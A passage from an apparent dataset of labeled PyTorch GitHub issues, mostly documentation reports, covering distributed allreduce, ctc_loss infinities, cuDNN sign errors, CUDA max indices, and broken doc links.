recv=recv)\r\n    print(recv)\r\n\r\ndef init_process(rank, size, fn, backend='gloo'):\r\n    \"\"\" Initialize the distributed environment. \"\"\"\r\n    os.environ['MASTER_ADDR'] = '127.0.0.1'\r\n    os.environ['MASTER_PORT'] = '29500'\r\n    dist.init_process_group(backend, rank=rank, world_size=size)\r\n    fn(rank, size)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    size = 4\r\n    processes = []\r\n    for rank in range(size):\r\n        p = Process(target=init_process, args=(rank, size, run_allreduce))\r\n        p.start()\r\n        processes.append(p)\r\n\r\n    for p in processes:\r\n        p.join()\r\n```\r\n\r\nThe terminal output is \r\n\r\n```bash\r\n~/Workspace$ python main.py\r\n# original data\r\nMessage from 0 tensor([0., 0., 0.])\r\nMessage from 1 tensor([1., 1., 1.])\r\n# data after allreduce (does not work as expect)\r\nMessage from 0 tensor([0., 0., 0.])\r\nMessage from 1 tensor([1., 1., 1.])\r\n```\r\n\r\nThe correct code snippet should be \r\n\r\n```python\r\ndef allreduce(send, recv):\r\n    rank = dist.get_rank()\r\n    size = dist.get_world_size()\r\n    send_buff = send.clone()\r\n    recv_buff = send.clone()\r\n    accum = send.clone()\r\n\r\n    left = ((rank - 1) + size) % size\r\n    right = (rank + 1) % size\r\n\r\n    for i in range(size - 1):\r\n        if i % 2 == 0:\r\n            # Send send_buff\r\n            send_req = dist.isend(send_buff, right)\r\n            dist.recv(recv_buff, left)\r\n            accum[:] += recv_buff[:]\r\n        else:\r\n            # Send recv_buff\r\n            send_req = dist.isend(recv_buff, right)\r\n            dist.recv(send_buff, left)\r\n            accum[:] += send_buff[:]\r\n        send_req.wait()\r\n    recv[:] = accum[:]\r\n```\r\n\r\nThough I didn't quite understand the usage of `send_buffer` and `recv_buffer` here, to avoid read/write collision? \r\n\r\n\n\ncc @ezyang @gchanan @zou3519 @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nCan't pin storage memory.\r\nNot sure if this is planned or common behavior, but if this is part of the interface I guess it shouldn't fail.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. ```import torch; torch.randn(10).storage().pin_memory()```\r\n\r\nAttributeError: module 'torch.cuda' has no attribute '_host_allocator'\r\n\r\n## Expected behavior\r\nReturns a copy of storage which is pinned.\r\n\r\n## Environment\r\n(built from source)\r\n\r\nCollecting environment information...\r\nPyTorch version: nightly\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 18.04.3 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: \r\nGPU 0: GeForce RTX 2080 Ti\r\nGPU 1: GeForce RTX 2080 Ti\r\nGPU 2: GeForce RTX 2080 Ti\r\nGPU 3: GeForce RTX 2080 Ti\r\nGPU 4: GeForce RTX 2080 Ti\r\nGPU 5: GeForce RTX 2080 Ti\r\nGPU 6: GeForce RTX 2080 Ti\r\n\r\nNvidia driver version: 440.44\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.17.4\r\n[pip] torch==nightly\r\n[pip] torchvision==0.5.0a0+2d7c066\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py37ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py37hd6b4f25_0  \r\n[conda] pytorch                   nightly         py3.7_cuda10.1.243_cudnn7.6.5_1    saareliad\r\n[conda] torchvision               0.5.0a0+2d7c066          pypi_0    pypi## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\r\n(What I'm really trying to do is find some hack to create pinned memory which is also shared, currently only managed to do so with pin_memory() than os.fork(), (before cuda is initialized), I'd like to do it on Storage too and not just the tensor itself)...\n\ncc @ngimel "},{"labels":["documentation",null],"text":"**UPD** summary of all the long discussion for further discoverability:\r\n1. F.ctc_loss will produce inf loss if presented with invalid unalignable examples\r\n2. Such invalid examples may be generated by official usage code example if one is extremely unlucky or if one twists the dimension sizes a little bit\r\n3. When presented with invalid examples, sum and mean reduction modes by default cause the whole batch loss to be **inf**\r\n\r\nProposals:\r\n1. Have docs warn clearly about conditions on valid examples\r\n2. Have docs warn clearly that the official usage example may produce invalid examples / fix the official code example\r\n3. Enable zero_infinity = True by default or at least in reduction modes sum/mean\r\n\r\n**BELOW IS THE ORIGINAL ISSUE DESCRIPTION**\r\n\r\n```python\r\nimport torch\r\nimport torch.nn.functional as F\r\n\r\ndef test_ctc(C, B = 1, T = 2, full = False):\r\n    log_probs = torch.randn(B, C, T).log_softmax(dim = 1)\r\n    input_lengths = torch.full((B,), T, dtype=torch.long)\r\n\r\n    target_lengths = torch.full((B,), T, dtype = torch.long)\r\n    if full:\r\n        targets = torch.full((B, T), C - 1, dtype = torch.long)\r\n    else:\r\n        targets = torch.randint(1, C, (B, T), dtype=torch.long)\r\n\r\n    loss = F.ctc_loss(log_probs.permute(2, 0, 1), targets, input_lengths, target_lengths)\r\n    print(float(loss))\r\n\r\ntest_ctc(C = 64, full = False)\r\n# 4.894557952880859\r\n\r\ntest_ctc(C = 2, full = False)\r\n# inf\r\n\r\ntest_ctc(C = 64, full = True)\r\n# inf\r\n```\r\n\r\nDocs specify that targets can't be blank. If same consecutive labels are not supported, I think it should be explicitly mentioned in docs. And maybe docs should specify some workaround to encode consecutive same-valued targets (given that blank to separate them isn't allowed by docs).\r\n\r\nCurrent docs: `Each element in the target sequence is a class index. And the target index cannot be blank (default=0)`"},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/master/torch.html?highlight=histc#torch.histc:\r\n```\r\nmin (int) ‚Äì lower end of the range (inclusive)\r\nmax (int) ‚Äì upper end of the range (inclusive)\r\n```\r\n\r\nI think this is erroneous, the type should be float and also to accept PyTorch scalar type (as it can be common to write `min = bins_tensor.min(), max = bins_tensor.max())`"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe documentation for [BCELoss](https://pytorch.org/docs/stable/nn.html#bceloss) explains that the formula used to compute the loss is `l_n = -w_n [y_n \\ln(x_n)+(1-y_n)\\ln(1-x_n)]`. However, the documentation does not explain what happens when `x_n = 0, 1` with `0 < y_n < 1`. In these two cases, the result should be infinite.\r\n\r\nIt appears that the value is quietly substituted for stability. However, there is no mention of this in the documentation for the loss layer, nor is it explained how this is accomplished.\r\n\r\nI also could not find the code that implemented binary_cross entropy. I bring this up because the code should be consulted when explaining what is happening for these edge cases.\r\n\r\n(This came up while investigating #31396)\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new --> [https://pytorch.org/docs/stable/nn.html#nllloss](url) yi = ith element in the target tensor\r\n"},{"labels":["documentation",null],"text":"`torch::pickle_save` and `torch::pickle_load` have no docs, maybe `torch::save/load` should also be deprecated since they are more limited"},{"labels":["documentation",null],"text":"## üöÄ Feature\r\nIt would be excellent to have a button to download the docs for offline use, from the main docs page. This is an included feature on Sphinx. For example: on [Flask's docs](http://flask.palletsprojects.com/en/1.1.x/), if you click the floating green version in the lower right, there's a \"download html\" option.\r\n\r\n## Motivation\r\nBuilding the source to make the docs locally is very time consuming, and sometimes you want to learn something offline. My specific use-case is programming on a plane.\r\n\r\n\r\n"},{"labels":[null,"documentation",null,null,null],"text":"`THCCachingHostAllocator` mentions that:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/af638ad5d7c8fc9ff97f0ad1cd2bbcfa3ced514e/aten/src/THC/THCCachingHostAllocator.cpp#L85-L88\r\n\r\nHowever @baobablyh discovers that, if multiple processes call pinned memory with the same default device, it could hang either at the pinned memory tensor creation or some subsequent D2H communication (see #31095 for more discussion, #28883 and #30945 for code). We haven't found out the root cause yet, but it looks like pinned memory would have some side effect on the current device. While we continue investigating the root cause, we should add an `N.B.` to the above comments and `pinned_memory` API doc to warn future users/devs.\r\n\n\ncc @ngimel"},{"labels":["documentation",null],"text":"Trying to use `torch.logsumexp` over multiple dimensions errors out.\r\n\r\n```python3\r\n>>> A = torch.ones(3, 3)\r\n>>> torch.logsumexp(A, dim=(0, 1))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: logsumexp(): argument 'dim' must be int, not tuple\r\n```\r\n\r\nHowever, in the latest stable documents (https://pytorch.org/docs/stable/torch.html#torch.logsumexp), it clearly states for the `dim` parameter:\r\n```\r\ndim (int or tuple of python:ints) ‚Äì the dimension or dimensions to reduce.\r\n```\r\nThroughout the description, it also talks about `dim` as being allowed to be multi-dimensional.\r\n\r\nAccording to #15597, this should be fixed, but it's not.\r\n\r\nFurthermore, I believe that `torch.logsumexp` should treat dimension similarly to `torch.sum`. Just like `torch.sum`, it should absolutely allow for `dim` to be a tuple of ints. And if `dim` is not specified, it should operate over the whole tensor."},{"labels":["documentation",null],"text":"MathJax in your docs is by default rendered tiny (too small to read) in Firefox...\r\n\r\nExample screenshot from: https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html\r\n<img width=\"862\" alt=\"image\" src=\"https://user-images.githubusercontent.com/464192/70542681-6d732480-1b69-11ea-8daf-e3fa3aa62822.png\">\r\n\r\nMy guess is some CSS problem..."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nHi, when I try to follow the tutorial **Using the PyTorch C++ Frontend**. At the beginning of the articleÔºåthe toy example CMakeLists.txt was written like this:\r\n```\r\ncmake_minimum_required(VERSION 3.0 FATAL_ERROR)\r\nproject(dcgan)\r\n\r\nfind_package(Torch REQUIRED)\r\n\r\nadd_executable(dcgan dcgan.cpp)\r\ntarget_link_libraries(dcgan \"${TORCH_LIBRARIES}\")\r\nset_property(TARGET dcgan PROPERTY CXX_STANDARD 11)\r\n```\r\n\r\nBut I get the **error** `error: #error You need C++14 to compile PyTorch`.\r\nI guess in the latest libtorch version, you may use some C++ 14 features. So, I change the last line in CMakeLists.txt to `set_property(TARGET dcgan PROPERTY CXX_STANDARD 14)`. It worked. I think we should make some updates for this tutorial."},{"labels":[null,null,"documentation",null],"text":"## üìö Documentation\r\n\r\nWe should add docs for the c10d.ProcessGroupGloo and c10d.ProcessGroupNCCL constructors since calling them directly is a way of initializing multiple process groups on a single node. There is a use case for initializing multiple process groups with different backends. For example using NCCL for DDP GPU communication and GLOO for send/recv primitives. This functionality already exists in our distributed package but users were unaware of this since it wasn't documented clearly.\r\n\r\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528"},{"labels":["documentation",null,null],"text":"I have a simple question. I want to confirm that when I specify a class index in ignore_index, and reduction = 'mean', then the loss is not averaged over the ignored class.\r\n\r\nIn the documentation, it says \"When size_average is True, the loss is averaged over non-ignored targets.\" Just want to make sure that it will behave the same when reduction is 'mean'"},{"labels":["documentation",null,null],"text":"The gist of the issue is that at one point in my network in my project I feed positive float32 inputs `X` and `W` into a 1d (or 2d) convolution, but unexpectedly obtain explicitly negative outputs.\r\n\r\n## Details\r\nThe X input is nonnegative about 1e-2 with many explicit 0 (after an elementwise square, or abs), and the W input is positive but with quite large range of [1e‚Äì8, 1e+8] (after an exp). I take `F.conv2d(X, W, None)` and **expect nonnegative** outputs (finite or infinite), but actually get **significantly negative** values. The downstream computations rely on the result of this operation to be at least nonnegative.\r\n\r\nI tried `torch.backends.cudnn.deterministic = True`, or fp64, or clamping the `W` value and each time the problem seemed to had gone away. In my project I ended up clamping the result of the convolution to nonnegative range, and it sufficed.\r\n\r\nHaving observed this oddity got me worried, since in my understanding of floating point arithmetic the loss of precision and round off could yield imprecise results, but not **flip the sign** of the overall result. I read in the docs, that non-deterministic cudnn algorithms might induce this behaviour and yield inconsistent results, but I did not expect that atomic additions (according to cudnn reference) could spuriously flip the sign bit of a 32bit float.\r\n\r\nI understand that Github issues are not a Q&A support forum, but I think that this inconsistency, might of interest, and would very much appreciate any discussion of guarantees of single precision operations.\r\n\r\n## Minimally reproducing example\r\nI came up with a minimal example of this odd behaviour. My observations are as follows (based on this snippet, and on the real data within the network in my project):\r\n* negative outputs of various magnitude occur **only if** deterministic is *False*, and data is *fp32*, and the input `X` is a moderately large-dim tensor.\r\n* `X` and `W` of dims `...x12x12` and `...x4x4`, respectively, give a lot of very small fp32 numbers, some of which are negative\r\n* `X` and `W` of dims `...x11x11` and `...x3x3`, respectively, produce very rare negative tiny fp32, but mostly expected zeros\r\n\r\nThese suggest that some optimizations within cudnn might be responsible.\r\n\r\nThe following code constructs explicitly nonnegative `X` and `W`: `X` all zeros except for a single **1** at the *centre*, `W` is a 4x4 kernel with constant **1e-3**. I attach the pickled  [result.gz](https://github.com/pytorch/pytorch/files/3935238/result.gz)\r\n\r\n```python\r\nimport gzip\r\nimport torch\r\nimport torch.nn.functional as F\r\n\r\n# change these\r\ntorch.backends.cudnn.deterministic = False\r\ndevtype = dict(device=torch.device(\"cuda:0\"), dtype=torch.float32)\r\n\r\n# x -- zeros with a spike\r\nx = torch.zeros(1024, 1, 12, 12).to(**devtype)  \r\nx[..., 5, 5] = 1.\r\n\r\n# small nonnegative values\r\nw = (torch.ones(1, 1, 4, 4) * 1e-3).to(**devtype)\r\nassert x.ge(0).all() and w.ge(0).all()\r\n\r\n# conv1d/2d\r\nresult = F.conv2d(x, w, None)\r\nwith gzip.open(\"result.gz\", \"wb\") as fout:\r\n    torch.save(dict(x=x, w=w, result=result), fout)\r\n\r\nassert result.ge(0).all()\r\n```\r\n\r\nTo unpack the attached `.gz` pickled result.\r\n```python\r\nimport gzip\r\nimport torch\r\n\r\nwith gzip.open(\"result.gz\", \"rb\") as fin:\r\n    pack = torch.load(fin)\r\n\r\npack[\"result]\r\n```\r\n\r\nHere is a link to a [colab notebook](https://colab.research.google.com/drive/136n8oKDitchxEkXMhV7AJeYfFUayiS4X), where it can be seen, that the output is spurious even for `X` is `25 x 1 x 12 x 12`. Especially striking is that `24 x 1 x 12 x 12` appears to be correct.\r\n\r\n## Specs and versions\r\nBelow are very abridged specs:\r\n\r\n`Intel(R) Xeon(R) CPU E5-2698 v4 @ 2.20GHz, 256GB RAM`, `4x GeForce GTX 1080 Ti` with `Driver Version: 390.77` on `Linux Mint 18.3 Sylvia (GNU/Linux 4.10.0-38-generic x86_64)` and conda `python 3.7.4` packages:\r\n* `pytorch                   1.1.0           py3.7_cuda9.0.176_cudnn7.5.1_0    pytorch`\r\n* `cudatoolkit               9.0                  h13b8566_0`\r\n"},{"labels":["documentation",null],"text":"Going to https://pytorch.org/docs/stable/__config__.html or https://pytorch.org/docs/master/__config__.html hits the 404 page\r\n\r\n![image](https://user-images.githubusercontent.com/9407960/70189001-f93b0b80-16a6-11ea-8f20-47d058eb2fee.png)\r\n\r\nWeirdly it does work fine on a local docs build\r\n\r\n![image](https://user-images.githubusercontent.com/9407960/70189029-0952eb00-16a7-11ea-974b-738e6c5c8150.png)\r\n"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nWhen someone writes a new torch operator and forgets to add an entry to https://github.com/pytorch/pytorch/blob/master/docs/source/torch.rst, the `test/test_doc_coverage.py` gives the following error:\r\n\r\n```\r\nDec 04 22:30:21 ======================================================================\r\nDec 04 22:30:21 FAIL: test_torch (__main__.TestDocCoverage)\r\nDec 04 22:30:21 ----------------------------------------------------------------------\r\nDec 04 22:30:21 Traceback (most recent call last):\r\nDec 04 22:30:21   File \"test_docs_coverage.py\", line 77, in test_torch\r\nDec 04 22:30:21     don't want to document?''')\r\nDec 04 22:30:21 AssertionError: \r\nDec 04 22:30:21 The lists of functions documented in torch.rst and in python are different.\r\nDec 04 22:30:21 Did you forget to add a new thing to torch.rst, or whitelist things you\r\nDec 04 22:30:21 don't want to document?\r\n```\r\n\r\nThis is not the clearest thing in the world. I see the following two improvements we could make:\r\n1) List out what functions are different.\r\n2) Explicitly state what torch.rst is. Something like \"For the documentation of an operator to appear in <insert_link_to_docs>, it needs an entry in torch.rst <link to torch.rst>. Please add one\"\r\n\r\nWe got pretty confused over in https://github.com/pytorch/pytorch/pull/30493 about this.\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/70160941-4b6d3400-1689-11ea-9033-b44a9b2a3c15.png)\r\n"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\nIn some cases - as in the example below, tensor.max() fails to log the indices in the cuda result.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\nimport torch\r\nrnd = torch.tensor([[ 0.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000],\r\n        [ 0.5000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000],\r\n        [ 8.0000,  8.0000,  8.0000,  8.0000,  8.0000,  8.0000,  8.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000],\r\n        [ 7.0000,  7.0000,  7.0000,  7.0000,  7.0000,  7.0000, -1.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000]])\r\n\r\nprint(rnd.max(dim=1))\r\nprint((rnd.cuda()).max(dim=1))\r\n\"\"\" my results: \r\n# CPU\r\ntorch.return_types.max(\r\nvalues=tensor([0.0000, 0.5000, 8.0000, 7.0000]),\r\nindices=tensor([0, 0, 6, 5]))\r\n#CUDA\r\ntorch.return_types.max(\r\nvalues=tensor([0.0000, 0.5000, 8.0000, 7.0000], device='cuda:0'),\r\nindices=tensor([0, 0, 0, 0], device='cuda:0'))\r\n\"\"\"\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\nI'd've expected torch.max to return same order of max indices in  cuda and cpu.\r\n\r\n## Environment\r\n\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Ubuntu 18.04.3 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.1.243\r\nGPU models and configuration: GPU 0: TITAN RTX\r\nNvidia driver version: 435.21\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.4\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.17.2\r\n[pip] torch==1.3.0\r\n[pip] torchaudio==0.2\r\n[pip] torchfile==0.1.0\r\n[pip] torchvision==0.4.1a0+d94043a\r\n[conda] mkl                       2019.4                      243  \r\n[conda] pytorch                   1.3.0           py3.6_cuda10.0.130_cudnn7.6.3_0    pytorch\r\n[conda] torchaudio                0.2.0                    py36_1    pytorch\r\n[conda] torchfile                 0.1.0                      py_0    conda-forge\r\n[conda] torchvision               0.4.1                py36_cu100    pytorch\r\n\r\n<!-- Add any other context about the problem here. -->\r\nThis is a special case, clearly, I encountered debugging some results. I would expect the indices to return the same preference: if one calls .max() on  a tensor, the index reutrned by cpu is the highest index of the highest value, in cuda, it is the lowest index of the highest value.\r\n\r\n## Workaround found: argmax returns the same order of indices\r\n```python\r\nprint(\"argmax\")\r\nprint(torch.argmax(rnd, dim=1))\r\n\r\nprint(\"argmax cuda\")\r\nprint(torch.argmax(rnd.cuda(), dim=1))\r\n\r\n\"\"\" argmax results\r\nargmax\r\ntensor([0, 0, 6, 5])\r\nargmax cuda\r\ntensor([0, 0, 6, 5], device='cuda:0')\r\n\"\"\"\r\n```\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null,null],"text":"## üìö Documentation\r\n\r\nUsers typically expect in-place operations to save memory over out of place variants. There are some cases, e.g. when mixed-type operations will perform the op into a different tensor of a common dtype, or when (after https://github.com/pytorch/pytorch/pull/30429), performing certain operations on uncoalesced sparse tensors. The memory characteristics should be explained somewhere in the docs.\r\n\r\n\r\n\n\ncc @vincentqb"},{"labels":[null,null,"documentation",null],"text":"## üêõ Bug\r\n\r\nI am using a Tesla K40m, installed pytorch 1.3 with conda, using CUDA 10.1\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Have a box with a Tesla K40m\r\n1. `conda install pytorch cudatoolkit -c pytorch`\r\n1. show cuda is available\r\n```\r\npython -c 'import torch; print(torch.cuda.is_available());'\r\n>>> True\r\n```\r\n1. Instantiate a model and call `.forward()`\r\n```\r\nTraceback (most recent call last):\r\n  File \"./baselines/get_results.py\", line 395, in <module>\r\n    main(args)\r\n  File \"./baselines/get_results.py\", line 325, in main\r\n    log_info = eval_main(eval_args)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/baselines/eval_task.py\", line 165, in main\r\n    log_info = trainer.test(0, evaluate=True)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_trainers.py\", line 110, in test\r\n    evaluate=evaluate)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_trainers.py\", line 220, in iteration\r\n    model_output = self.model.forward(input_data, input_lengths)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_models.py\", line 49, in forward\r\n    self.hidden = self.init_hidden(batch_size, device=device)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_models.py\", line 40, in init_hidden\r\n    return (torch.randn(1, batch_size, self.hidden_dim, device=device),\r\nRuntimeError: CUDA error: no kernel image is available for execution on the device\r\n```\r\n\r\nFirst tried downgrading to cudatoolkit=10.0, that exhibited same issue.\r\n\r\nThe code will run fine if you repeat steps above but instead `conda install pytorch=1.2 cudatoolkit=10.0 -c pytorch`.\r\n\r\n\r\n## Expected behavior\r\nIf no longer supporting a specific GPU, please bomb out upon load with useful error message.\r\n\r\n\r\n## Environment\r\n\r\nUnfort ran your script after I 'fixed' so pytorch version will be 1.2 here - issue encountered with version 1.3.\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.2.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Scientific Linux release 7.6 (Nitrogen)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-36)\r\nCMake version: version 2.8.12.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: GPU 0: Tesla K40m\r\nNvidia driver version: 430.50\r\ncuDNN version: /usr/lib64/libcudnn.so.6.5.18\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.16.3\r\n[pip3] numpydoc==0.8.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py37ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py37hd6b4f25_0  \r\n[conda] pytorch                   1.2.0           py3.7_cuda10.0.130_cudnn7.6.2_0    pytorch\r\n[conda] torchvision               0.4.0                py37_cu100    pytorch\r\n```\r\n\n\ncc @ezyang @gchanan @zou3519 @jerryzh168 @ngimel"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nIs it possible to provide a timestamp to when a tutorial was last updated in the docs, this could also be applied to modules in docs, like\r\n```\r\nnn.Flatten\r\nlast updated - time\r\n```"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/storage.html#torch.FloatStorage.from_buffer\r\n\r\nThis method is useful when ingesting byte streams/arrays from external programs like sox or ffmpeg."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe docs page currently contains a link to \"torch.__config__\" in the left sidebar under Python API.\r\n\r\nThis link leads to a dead end (https://pytorch.org/docs/stable/__config__.html).\r\n\r\nThe link or the sidebar should be updated. \r\n\r\nThanks!\r\n-Dan"},{"labels":[null,"documentation",null],"text":"## üöÄ Feature\r\nAlong with all the instructions for local installation on https://pytorch.org/get-started/locally/ it would be great to also add a few lines about Google Colab notebooks. \r\n\r\n## Motivation\r\nColab notebooks already set up with all required libraries pre-installed. It saves time, and users don't have to deal with errors while building or installing. All the work already done. Also, it would be a great place to start because the already existing Colab notebooks can be imported without any hassle.\r\n\r\n## Pitch\r\nNA\r\n\r\n## Alternatives\r\nNA\r\n\r\n## Additional context\r\nNA"},{"labels":["documentation",null],"text":"## ‚ùì Issue\r\n\r\nBuilding a minimal C++ application which loads a torch script model results in:\r\n`LINK : fatal error LNK1181: cannot open input file 'torch-NOTFOUND.obj'`\r\n\r\n## Reproduce\r\n\r\nFollow the guidelines from PyTorch documentation ([this ](https://pytorch.org/tutorials/advanced/cpp_export.html) and [this](https://pytorch.org/cppdocs/installing.html#minimal-example)). \r\n\r\nThe issue occurs when executing the following commands:\r\n```\r\nmkdir build\r\ncd build\r\ncmake -DCMAKE_PREFIX_PATH=/absolute/path/to/libtorch ..\r\ncmake --build .\r\n```\r\n\r\nThe first guide says to run `cmake make`, which does not work for Visual Studio at all.\r\n\r\nBuilding succeeds on condition that Release configuration is specified:\r\n`cmake --build . --config Release`. Other configurations (MinSizeRel, RelWithDebInfo and the default one fail with the aforementioned linker error).\r\n\r\n## Environment\r\n\r\nLibTorch 1.3 stable, release, CPU\r\nWindows 8.1 x64\r\nVisual Studio 2019 Community (with CMake component installed)\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nDocumentation for [torch.svd](https://pytorch.org/docs/stable/torch.html#torch.svd) does not indicate whether or not singular values are returned in descending order. My suspicion is that they are since both LAPACK and MAGMA's ?gesdd return them in descending order. It seems like this should be clarified in the docs to avoid unnecessary sorting, or mistaken assumptions.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nCame up in comments for https://github.com/pytorch/pytorch/pull/30208. A class called `RpcBackendOptions` is used to pass in certain arguments (like store init method, timeout) to the RPC backend - we should add docs for this and explain what options can be set.\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":["documentation",null],"text":"![pytorch-quantization-bug-rendering-QConfig](https://user-images.githubusercontent.com/45861273/69389653-82068000-0c81-11ea-9257-cb0f966ff4a3.png)\r\n\r\n\r\nwhat is going on with QConfig()\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":[null,"documentation",null,null,null,null],"text":"The doc says that `eps` helps preventing division by zero (without mentioning how).  The actual implementation is \r\nhttps://github.com/pytorch/pytorch/blob/0fdbb762d1a9e6b9c262760b6b67bcb3d0814407/aten/src/ATen/native/Distance.cpp#L15-L17\r\n\r\nHowever, `norm(zero_vector)` is perfectly stable and gives correct subgradient. So unless `pairwise_dist` output is used as a denominator, there is no DBZ or any instability. And how to use `pairwise_dist` output should be in users' control, unless we want to automatically add `eps` to every op that can output zeros.\r\n\r\nProposal: remove `eps` argument.\r\n\r\ncc @ezyang @SsnL @gchanan"},{"labels":[null,"documentation",null,null],"text":"It seems to copy:\r\n```python\r\nimport torch\r\na = torch.rand(3, 3)\r\nprint(a.data_ptr(), a.conj().data_ptr()) # 94290110120192 94290110120320\r\n```\r\n\r\nHowever, if the caller wants to save memory for real tensors and does not use inplace ops, they need to do ifs (and enumerate all complex types) like in https://github.com/pytorch/pytorch/pull/29488/files#diff-62a3ecc69398a4b080599d5222c535b1R70\r\n\r\nAlso this copy semantics seems not documented: https://pytorch.org/docs/master/torch.html?highlight=conj#torch.conj\n\ncc @VitalyFedyunin @ngimel @mruberry"},{"labels":["documentation",null],"text":"![image](https://user-images.githubusercontent.com/1041752/69262021-fcbc9600-0bc2-11ea-97af-236226678212.png)\r\n"},{"labels":["documentation",null,null],"text":"The `remote`/`rpc_sync`/`rpc_async` APIs are listed as `torch.distributed.rpc.api.*` in our doc. The `.api` segment should not appear there.\r\n\r\n![Screen Shot 2019-11-18 at 12 22 31 PM](https://user-images.githubusercontent.com/16999635/69074832-224c7280-09fe-11ea-9fa8-72ffc568ac60.png)\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini 